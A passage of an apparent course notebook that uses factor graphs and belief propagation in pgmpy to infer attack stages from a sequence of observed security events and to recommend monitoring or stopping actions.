    "G.add_factors(f_1, f_2)     ## Add factor functions\n",
    "\n",
    "###############################\n",
    "#   TODO: Add the edges for random \n",
    "#   variables and factor functions\n",
    "###############################\n",
    "G.add_edges_from([('S1',f_1), ('S1',f_2), ('E1',f_2)])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 2.2 & 2.3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+-------+-----------+\n",
      "| S1    |   phi(S1) |\n",
      "+=======+===========+\n",
      "| S1(0) |    0.2550 |\n",
      "+-------+-----------+\n",
      "| S1(1) |    0.0750 |\n",
      "+-------+-----------+\n"
     ]
    }
   ],
   "source": [
    "bp = BeliefPropagation(G)\n",
    "###############################\n",
    "#   TODO: Compute the marginal probability\n",
    "###############################\n",
    "margin = bp.query(variables = ['S1'], show_progress = False)\n",
    "print(margin)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "$S_1$ = 0 (no attack) maximizes P($S_1$)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 2.4 & 2.5"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+-------+-----------+\n",
      "| S1    |   phi(S1) |\n",
      "+=======+===========+\n",
      "| S1(0) |    0.1700 |\n",
      "+-------+-----------+\n",
      "| S1(1) |    0.0750 |\n",
      "+-------+-----------+\n"
     ]
    }
   ],
   "source": [
    "margin = bp.query(variables = ['S1'], evidence = {'E1':1}, show_progress = False)\n",
    "print(margin)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "$S_1$ = 0 (no attack) is the most probable on seeing $E_1$"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 2.6"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "For Task 2.2:\n",
    "\n",
    "$$ P(S_1) \\propto \\displaystyle\\sum_{E1}  f(S_1) g(S_1,E_1) $$\n",
    "\n",
    "$$ P(S_1) \\propto f(S_1) g(S_1, E_1 = 0) + f(S_1) g(S_1, E_1 = 1) $$\n",
    "\n",
    "$$ P(S_1) \\propto \\begin{bmatrix} 0.85 \\\\ 0.15 \\end{bmatrix} \\begin{bmatrix}  0.1&+&0.2 \\\\ 0&+&0.5 \\end{bmatrix} $$\n",
    "\n",
    "$$ P(S_1) \\propto \\begin{bmatrix} 0.255 (S1 = 0) \\\\ 0.075 (S1 = 1) \\end{bmatrix} $$"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "For Task 2.3:\n",
    "\n",
    "$$ P(S_1 | E_1 = 1) \\propto  f(S_1) g(S_1,E_1 = 1) $$\n",
    "\n",
    "$$ P(S_1) \\propto f(S_1) g(S_1, E_1 = 1) $$\n",
    "\n",
    "$$ P(S_1) \\propto \\begin{bmatrix} 0.85 \\\\ 0.15 \\end{bmatrix} \\begin{bmatrix} 0.2 \\\\ 0.5 \\end{bmatrix} $$\n",
    "\n",
    "$$ P(S_1) \\propto \\begin{bmatrix} 0.170 \\\\ 0.075 \\end{bmatrix} $$"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Hand calculations match what we get from the code."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Task 3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "ATTACK_EVENTS_MAP = {\n",
    "    'Scan':1,\n",
    "    'Login':2,\n",
    "    'Sensitive_URI':3,\n",
    "    'New_Kernel_Module':4,\n",
    "    'DNS_Tunneling':5\n",
    "}\n",
    "ATTACK_STATES_MAP = {\n",
    "    'benign': 1,\n",
    "    'discovery': 2,\n",
    "    'access': 3,\n",
    "    'lateral_movement': 4,\n",
    "    'privilege_escalation': 5,\n",
    "    'persistence': 6,\n",
    "    'defense_evasion': 7,\n",
    "    'collection': 8,\n",
    "    'exfiltration': 9,\n",
    "    'command_control': 10,\n",
    "    'execution': 11\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 3.0 "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{3: [0.5533333333333333, 0, 0, 0, 0.44666666666666666, 0, 0, 0, 0, 0, 0],\n",
       " 1: [0.936, 0.064, 0, 0, 0, 0, 0, 0, 0, 0, 0],\n",
       " 4: [0.875, 0, 0, 0, 0, 0.125, 0, 0, 0, 0, 0],\n",
       " 5: [0.02, 0, 0, 0, 0, 0, 0, 0, 0.98, 0, 0],\n",
       " 2: [1.0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]}"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "event_review = open('event_review.txt', 'r') \n",
    "Lines = event_review.readlines()\n",
    "df = pd.DataFrame(index = range(len(Lines)), columns = ['Event', 'Latent Attack State'])\n",
    "i = 0\n",
    "for string in Lines:\n",
    "    df.loc[i,'Event'] = (string.split(' ')[0]).split(']')[1]\n",
    "    df.loc[i,'Latent Attack State'] = ((string.split(' ')[-1]).split('\\n')[0]).split(']')[-1]\n",
    "    if string.split(' ')[-1] == '\\n':\n",
    "        df.loc[i,'Latent Attack State'] = 'exfiltration'\n",
    "    i+=1\n",
    "\n",
    "df = df.replace({\"Event\":ATTACK_EVENTS_MAP, \"Latent Attack State\":ATTACK_STATES_MAP})\n",
    "\n",
    "f_dict = {}\n",
    "for event_ in df['Event'].unique():\n",
    "    templist = 11*[0]\n",
    "    newdf = df[df['Event'] == event_]\n",
    "    for i in newdf['Latent Attack State'].unique():\n",
    "        templist[i-1] = newdf['Latent Attack State'].value_counts()[i] / len(newdf)\n",
    "    f_dict[event_] = templist\n",
    "f_dict"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[[0.936, 0.064, 0, 0, 0, 0, 0, 0, 0, 0, 0],\n",
       " [1.0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],\n",
       " [0.5533333333333333, 0, 0, 0, 0.44666666666666666, 0, 0, 0, 0, 0, 0],\n",
       " [0.5533333333333333, 0, 0, 0, 0.44666666666666666, 0, 0, 0, 0, 0, 0],\n",
       " [0.5533333333333333, 0, 0, 0, 0.44666666666666666, 0, 0, 0, 0, 0, 0],\n",
       " [0.875, 0, 0, 0, 0, 0.125, 0, 0, 0, 0, 0],\n",
       " [0.02, 0, 0, 0, 0, 0, 0, 0, 0.98, 0, 0],\n",
       " [0.02, 0, 0, 0, 0, 0, 0, 0, 0.98, 0, 0],\n",
       " [0.02, 0, 0, 0, 0, 0, 0, 0, 0.98, 0, 0]]"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "events = [1,2,3,3,3,4,5,5,5] #e1 to e9 as given in the problem\n",
    "f = [] #A list of lists, each row is the fi for ei\n",
    "for event in events:\n",
    "    f.append(f_dict[event])\n",
    "f"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "These are the requried f1 to f9 (factor functions for the observed events)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 3.1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "'''\n",
    "This function was taken from stackoverflow: \n",
    "https://stackoverflow.com/questions/6822725/rolling-or-sliding-window-iterator\n",
    "'''\n",
    "from itertools import islice\n",
    "\n",
    "def window(seq, n=3):\n",
    "    \"Returns a sliding window (of width n) over data from the iterable\"\n",
    "    \"   s -> (s0,s1,...s[n-1]), (s1,s2,...,sn), ...                   \"\n",
    "    it = iter(seq)\n",
    "    result = tuple(islice(it, n))\n",
    "    if len(result) == n:\n",
    "        yield result\n",
    "    for elem in it:\n",
    "        result = result[1:] + (elem,)\n",
    "        yield result"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Most common event sequence: ('Scan', 'Sensitive_URI', 'New_Kernel_Module')\n",
      "Most common repeated sequence: ('Sensitive_URI', 'Sensitive_URI', 'Sensitive_URI')\n",
      "\n",
      "\n",
      "c: [0, 0, 0, 0, 0, 0.9306930693069307, 0, 0, 0, 0, 0]\n",
      "r: [0, 0, 0, 0, 0.7425742574257426, 0, 0, 0, 0, 0, 0]\n"
     ]
    }
   ],
   "source": [
    "c_counter, r_counter = Counter(), Counter()\n",
    "\n",
    "attack_sequences = open('attack_sequences.txt', 'r') \n",
    "Lines = attack_sequences.readlines() \n",
    "for line in Lines:\n",
    "    l = line.strip().split(' ')\n",
    "    for sequence in window(l,3):\n",
    "        if len(set(sequence)) == 1:\n",
    "            r_counter[sequence] +=1\n",
    "        else:\n",
    "            c_counter[sequence] +=1\n",
    "\n",
    "c_sequence = c_counter.most_common(1)[0][0]\n",
    "r_sequence = r_counter.most_common(1)[0][0]\n",
    "print(\"Most common event sequence: {}\".format(c_sequence))\n",
    "print(\"Most common repeated sequence: {}\".format(r_sequence))\n",
    "\n",
    "#for probabilities:\n",
    "c_count_probability, r_count_probability = [], []\n",
    "\n",
    "for line in Lines:\n",
    "    l = line.strip().split(' ')\n",
    "    c, r = False, False\n",
    "    for sequence in window(l,3):\n",
    "        if sequence == c_sequence:\n",
    "            c = True\n",
    "        if sequence == r_sequence:\n",
    "            r = True\n",
    "    c_count_probability.append(c)\n",
    "    r_count_probability.append(r)\n",
    "\n",
    "cp = sum(c_count_probability)/len(c_count_probability)\n",
    "rp = sum(r_count_probability)/len(r_count_probability)\n",
    "#print(\"C sequence probability = {}\".format(cp))\n",
    "#print(\"R sequence probability = {}\".format(rp))\n",
    "\n",
    "#Since c accounts for the persistance state and r for the privilege escalation, we directly write the 11d vectors:\n",
    "c_factor_function, r_factor_function = 11*[0], 11*[0]\n",
    "c_factor_function[5] = cp\n",
    "r_factor_function[4] = rp\n",
    "print('\\n')\n",
    "print(\"c: {}\".format(c_factor_function))\n",
    "print(\"r: {}\".format(r_factor_function))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 3.2  You will have to submit the graph you draw through Compass"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Submitted in CP1.5"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 3.3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "G = FactorGraph() ## Create FactorGraph object\n",
    "###############################\n",
    "#   TODO: Define factor functions\n",
    "###############################\n",
    "f_1 = DiscreteFactor(['s1','e1'], [11,1], f[0])\n",
    "f_2 = DiscreteFactor(['s2','e2'], [11,1], f[1])\n",
    "f_3 = DiscreteFactor(['s3','e3'], [11,1], f[2])\n",
    "f_4 = DiscreteFactor(['s4','e4'], [11,1], f[3])\n",
    "f_5 = DiscreteFactor(['s5','e5'], [11,1], f[4])\n",
    "f_6 = DiscreteFactor(['s6','e6'], [11,1], f[5])\n",
    "f_7 = DiscreteFactor(['s7','e7'], [11,1], f[6])\n",
    "f_8 = DiscreteFactor(['s8','e8'], [11,1], f[7])\n",
    "f_9 = DiscreteFactor(['s9','e9'], [11,1], f[8])\n",
    "\n",
    "r = DiscreteFactor(['s5','e3','e4','e5'], [11,1,1,1], r_factor_function)\n",
    "c = DiscreteFactor(['s6','e1','e3','e6'], [11,1,1,1], c_factor_function) \n",
    "\n",
    "\n",
    "'''\n",
    "Ideally the graph should be analyzed in the way given in this comment. But pgmpy does not consider the entire graph\n",
    "together due to disconnected nodes, thus, we analyze individual sections of the graph.\n",
    "\n",
    "See the graph image provided with CP1.5 for more clarity.\n",
    "\n",
    "G.add_nodes_from(['s'+str(i+1) for i in range(9)] + ['e'+str(i+1) for i in range(9)])  ## Add random variables \n",
    "G.add_factors(f_1,f_2,f_3,f_4,f_5,f_6,f_7,f_8,f_9,r,c)     ## Add factor functions\n",
    "\n",
    "G.add_edges_from([('s1',f_1), ('e1', f_1),\n",
    "                  ('s2',f_2), ('e2', f_2),\n",
    "                  ('s3',f_3), ('e3', f_3),\n",
    "                  ('s4',f_4), ('e4', f_4),\n",
    "                  ('s5',f_5), ('e5', f_5),\n",
    "                  ('s6',f_6), ('e6', f_6),\n",
    "                  ('s7',f_7), ('e7', f_7),\n",
    "                  ('s8',f_8), ('e8', f_8),\n",
    "                  ('s9',f_9), ('e9', f_9),\n",
    "                  ('s5',r), ('e3', r), ('e4', r), ('e5', r),\n",
    "                  ('s6',c), ('e1', c), ('e3', c), ('e6', c)])\n",
    "'''\n",
    "\n",
    "marginals = 9*[0]\n",
    "\n",
    "#First let's analyze all independent nodes:\n",
    "independent_nodes = [2, 7, 8, 9]\n",
    "\n",
    "for node in independent_nodes:\n",
    "    G = FactorGraph()\n",
    "    G.add_nodes_from(['s'+str(node), 'e'+str(node)])\n",
    "    factor_function = DiscreteFactor(['s'+str(node), 'e'+str(node)], [11,1], f[node - 1])\n",
    "    G.add_factors(factor_function)\n",
    "    G.add_edges_from([('s'+str(node), factor_function), ('e'+str(node), factor_function)])\n",
    "    marginals[node - 1] =  BeliefPropagation(G).query(variables = ['s'+str(node)], show_progress = False)\n",
    "\n",
    "    \n",
    "#Now we analyze the other section of the graph, which has connected nodes s1, s3, s4, s5, s6\n",
    "G = FactorGraph()\n",
    "dependent_nodes = [1,3,4,5,6]\n",
    "\n",
    "G.add_nodes_from(['s'+str(i) for i in dependent_nodes] + ['e'+str(i) for i in dependent_nodes])  ## Add random variables \n",
    "G.add_factors(f_1,f_3,f_4,f_5,f_6,r,c)\n",
    "G.add_edges_from([('s1',f_1), ('e1', f_1),\n",
    "                  ('s3',f_3), ('e3', f_3),\n",
    "                  ('s4',f_4), ('e4', f_4),\n",
    "                  ('s5',f_5), ('e5', f_5),\n",
    "                  ('s6',f_6), ('e6', f_6),\n",
    "                  ('s5',r), ('e3', r), ('e4', r), ('e5', r),\n",
    "                  ('s6',c), ('e1', c), ('e3', c), ('e6', c)])\n",
    "\n",
    "bp = BeliefPropagation(G)\n",
    "for node in dependent_nodes:\n",
    "    marginals[node - 1] = bp.query(variables = ['s'+str(node)], show_progress = False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 3.4"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### a. At every time point, provide the marginal probability of each state (Since we have 9 time points and 11 possible states, you should provide 99 probability values here)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+--------+-----------+\n",
      "| s1     |   phi(s1) |\n",
      "+========+===========+\n",
      "| s1(0)  |    0.9360 |\n",
      "+--------+-----------+\n",
      "| s1(1)  |    0.0640 |\n",
      "+--------+-----------+\n",
      "| s1(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s1(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s1(4)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s1(5)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s1(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s1(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s1(8)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s1(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s1(10) |    0.0000 |\n",
      "+--------+-----------+\n",
      "\n",
      "\n",
      "\n",
      "+--------+-----------+\n",
      "| s2     |   phi(s2) |\n",
      "+========+===========+\n",
      "| s2(0)  |    1.0000 |\n",
      "+--------+-----------+\n",
      "| s2(1)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s2(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s2(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s2(4)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s2(5)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s2(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s2(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s2(8)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s2(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s2(10) |    0.0000 |\n",
      "+--------+-----------+\n",
      "\n",
      "\n",
      "\n",
      "+--------+-----------+\n",
      "| s3     |   phi(s3) |\n",
      "+========+===========+\n",
      "| s3(0)  |    0.5533 |\n",
      "+--------+-----------+\n",
      "| s3(1)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s3(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s3(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s3(4)  |    0.4467 |\n",
      "+--------+-----------+\n",
      "| s3(5)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s3(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s3(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s3(8)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s3(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s3(10) |    0.0000 |\n",
      "+--------+-----------+\n",
      "\n",
      "\n",
      "\n",
      "+--------+-----------+\n",
      "| s4     |   phi(s4) |\n",
      "+========+===========+\n",
      "| s4(0)  |    0.5533 |\n",
      "+--------+-----------+\n",
      "| s4(1)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s4(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s4(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s4(4)  |    0.4467 |\n",
      "+--------+-----------+\n",
      "| s4(5)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s4(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s4(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s4(8)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s4(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s4(10) |    0.0000 |\n",
      "+--------+-----------+\n",
      "\n",
      "\n",
      "\n",
      "+--------+-----------+\n",
      "| s5     |   phi(s5) |\n",
      "+========+===========+\n",
      "| s5(0)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s5(1)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s5(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s5(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s5(4)  |    1.0000 |\n",
      "+--------+-----------+\n",
      "| s5(5)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s5(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s5(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s5(8)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s5(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s5(10) |    0.0000 |\n",
      "+--------+-----------+\n",
      "\n",
      "\n",
      "\n",
      "+--------+-----------+\n",
      "| s6     |   phi(s6) |\n",
      "+========+===========+\n",
      "| s6(0)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s6(1)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s6(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s6(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s6(4)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s6(5)  |    1.0000 |\n",
      "+--------+-----------+\n",
      "| s6(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s6(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s6(8)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s6(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s6(10) |    0.0000 |\n",
      "+--------+-----------+\n",
      "\n",
      "\n",
      "\n",
      "+--------+-----------+\n",
      "| s7     |   phi(s7) |\n",
      "+========+===========+\n",
      "| s7(0)  |    0.0200 |\n",
      "+--------+-----------+\n",
      "| s7(1)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s7(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s7(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s7(4)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s7(5)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s7(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s7(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s7(8)  |    0.9800 |\n",
      "+--------+-----------+\n",
      "| s7(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s7(10) |    0.0000 |\n",
      "+--------+-----------+\n",
      "\n",
      "\n",
      "\n",
      "+--------+-----------+\n",
      "| s8     |   phi(s8) |\n",
      "+========+===========+\n",
      "| s8(0)  |    0.0200 |\n",
      "+--------+-----------+\n",
      "| s8(1)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s8(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s8(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s8(4)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s8(5)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s8(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s8(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s8(8)  |    0.9800 |\n",
      "+--------+-----------+\n",
      "| s8(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s8(10) |    0.0000 |\n",
      "+--------+-----------+\n",
      "\n",
      "\n",
      "\n",
      "+--------+-----------+\n",
      "| s9     |   phi(s9) |\n",
      "+========+===========+\n",
      "| s9(0)  |    0.0200 |\n",
      "+--------+-----------+\n",
      "| s9(1)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s9(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s9(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s9(4)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s9(5)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s9(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s9(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s9(8)  |    0.9800 |\n",
      "+--------+-----------+\n",
      "| s9(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s9(10) |    0.0000 |\n",
      "+--------+-----------+\n",
      "\n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "for marginal in marginals:\n",
    "    marginal.normalize()\n",
    "    print(marginal)\n",
    "    print('\\n\\n')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### b. At every time point, provide the most probable state"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The most probable states at each time point are:\n",
    "\n",
    "t = 1: benign\n",
    "\n",
    "t = 2: benign\n",
    "\n",
    "t = 3: benign\n",
    "\n",
    "t = 4: benign\n",
    "\n",
    "t = 5: privilege escalation\n",
    "\n",
    "t = 6: persistence\n",
    "\n",
    "t = 7: exfiltration\n",
    "\n",
    "t = 8: exfiltration\n",
    "\n",
    "t = 9: exfiltration"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 3.5"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['NO-OP', 'NO-OP', 'NO-OP', 'NO-OP', 'MONITOR', 'MONITOR', 'STOP', 'STOP', 'STOP']\n"
     ]
    }
   ],
   "source": [
    "ACTIONS = {\n",
    "    # each value in an actions' vector corresponds to an attack stage\n",
    "    'NO-OP':   [1.,   0.61, 0.69, 0.09, 0.2 , 0. ,  0.,   0.,   0. ,  0. ,  0.  ],\n",
    "    'MONITOR': [0.  , 0.39, 0.31 ,0.84, 0.63, 0.7,  0.07 ,0.1 , 0. ,  0. ,  0.  ],\n",
    "    'STOP':    [0.  , 0.,   0.  , 0.07, 0.17, 0.3,  0.93 ,0.9 , 1. ,  1. ,  1.  ]\n",
    "}\n",
    "\n",
    "hidden_states = ['benign', 'benign', 'benign', 'benign', 'privilege_escalation', 'persistence','exfiltration', 'exfiltration', 'exfiltration']\n",
    "hidden_states_mapped = [ATTACK_STATES_MAP[state] for state in hidden_states]\n",
    "\n",
    "actions = []\n",
    "temp = np.argmax(np.array(list(ACTIONS.values())), axis = 0)\n",
    "for i in hidden_states_mapped:\n",
    "    actions.append(list(ACTIONS.keys())[temp[i-1]])\n",
    "print(actions)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 3.6"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Indicate the earliest stage in which your model should recommend stopping the attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Earliest stage in which 'STOP' is recommended is S7."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 3.7"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### a. Judge whether the most probable states for $s_1-s_6,s_8,s_9$ remain the same as Task3.2\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We create the new factor graph without s7"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "True\n",
      "True\n",
      "True\n",
      "True\n",
      "True\n",
      "True\n",
      "False\n",
      "True\n",
      "True\n"
     ]
    }
   ],
   "source": [
    "f_1 = DiscreteFactor(['s1','e1'], [11,1], f[0])\n",
    "f_2 = DiscreteFactor(['s2','e2'], [11,1], f[1])\n",
    "f_3 = DiscreteFactor(['s3','e3'], [11,1], f[2])\n",
    "f_4 = DiscreteFactor(['s4','e4'], [11,1], f[3])\n",
    "f_5 = DiscreteFactor(['s5','e5'], [11,1], f[4])\n",
    "f_6 = DiscreteFactor(['s6','e6'], [11,1], f[5])\n",
    "#f_7 = DiscreteFactor(['s7','e7'], [11,1], f[6])\n",
    "f_8 = DiscreteFactor(['s8','e8'], [11,1], f[7])\n",
    "f_9 = DiscreteFactor(['s9','e9'], [11,1], f[8])\n",
    "\n",
    "r = DiscreteFactor(['s5','e3','e4','e5'], [11,1,1,1], r_factor_function)\n",
    "c = DiscreteFactor(['s6','e1','e3','e6'], [11,1,1,1], c_factor_function) \n",
    "\n",
    "\n",
    "marginals_without_7 = 9*[0]\n",
    "\n",
    "#First let's analyze all independent nodes:\n",
    "independent_nodes = [2, 8, 9]\n",
    "\n",
    "for node in independent_nodes:\n",
    "    G = FactorGraph()\n",
    "    G.add_nodes_from(['s'+str(node), 'e'+str(node)])\n",
    "    factor_function = DiscreteFactor(['s'+str(node), 'e'+str(node)], [11,1], f[node - 1])\n",
    "    G.add_factors(factor_function)\n",
    "    G.add_edges_from([('s'+str(node), factor_function), ('e'+str(node), factor_function)])\n",
    "    marginals_without_7[node - 1] =  BeliefPropagation(G).query(variables = ['s'+str(node)], show_progress = False)\n",
    "\n",
    "    \n",
    "#Now we analyze the other section of the graph, which has connected nodes s1, s3, s4, s5, s6\n",
    "G = FactorGraph()\n",
    "dependent_nodes = [1,3,4,5,6]\n",
    "\n",
    "G.add_nodes_from(['s'+str(i) for i in dependent_nodes] + ['e'+str(i) for i in dependent_nodes])  ## Add random variables \n",
    "G.add_factors(f_1,f_3,f_4,f_5,f_6,r,c)\n",
    "G.add_edges_from([('s1',f_1), ('e1', f_1),\n",
    "                  ('s3',f_3), ('e3', f_3),\n",
    "                  ('s4',f_4), ('e4', f_4),\n",
    "                  ('s5',f_5), ('e5', f_5),\n",
    "                  ('s6',f_6), ('e6', f_6),\n",
    "                  ('s5',r), ('e3', r), ('e4', r), ('e5', r),\n",
    "                  ('s6',c), ('e1', c), ('e3', c), ('e6', c)])\n",
    "\n",
    "bp = BeliefPropagation(G)\n",
    "for node in dependent_nodes:\n",
    "    marginals_without_7[node - 1] = bp.query(variables = ['s'+str(node)], show_progress = False)\n",
    "\n",
    "for i in range(9):\n",
    "    try:\n",
    "        marginals_without_7[i].normalize()\n",
    "    except AttributeError:\n",
    "        pass\n",
    "    print(marginals_without_7[i] == marginals[i])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "(The only False is at s7 because s7 doesn't exist in the new FG. All other marginals remain the same.)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### b. State the reason for your judgement"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In the Factor Graph drawing, we see that s7 - e7 is independent of all other nodes. It is not connected to any other state via any factor function, like r or c. Hence, the value of s7 (or any indepenedent state-event pair) does not affect the rest of the graph in the belief propagation algorithm."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 3.8"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
